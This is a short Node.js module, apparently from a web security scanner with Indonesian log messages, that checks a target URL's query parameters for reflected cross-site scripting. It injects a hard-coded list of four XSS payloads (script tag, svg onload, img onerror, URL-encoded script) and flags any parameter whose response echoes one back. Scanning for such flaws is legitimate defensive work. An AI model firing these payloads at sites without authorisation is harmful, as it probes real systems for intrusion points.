const c = require("../colors");
const delay = (ms) => new Promise((r) => setTimeout(r, ms));

const PAYLOADS = [
  "<script>alert(1)</script>",
  "\"><svg/onload=alert(1)>",
  "<img src=x onerror=alert(1)>",
  "%3Cscript%3Ealert(1)%3C/script%3E"
];

async function scanXss(targetUrl) {
  console.log(c.cyan(`\n[*] Memeriksa Reflected XSS di: ${targetUrl.slice(0, 50)}...`));
  const results = [];
  let urlObj;
  try { urlObj = new URL(targetUrl); } catch { return results; }
  
  const params = [...urlObj.searchParams.keys()];
  if (params.length === 0) return results;
  
  for (const param of params) {
    for (const payload of PAYLOADS) {
      const testUrl = new URL(targetUrl);
      testUrl.searchParams.set(param, payload);
      try {
        const res = await fetch(testUrl.toString());
        const body = await res.text();
        
        if (body.includes(payload)) {
          console.log(`  ${c.red("[VULN]")} XSS di param "${param}" (Payload: ${payload.slice(0, 20)}...)`);
          results.push({ param, vulnerable: true, payload });
          break;
        }
      } catch {}
      await delay(600);
    }
  }
  return results;
}
module.exports = { scanXss };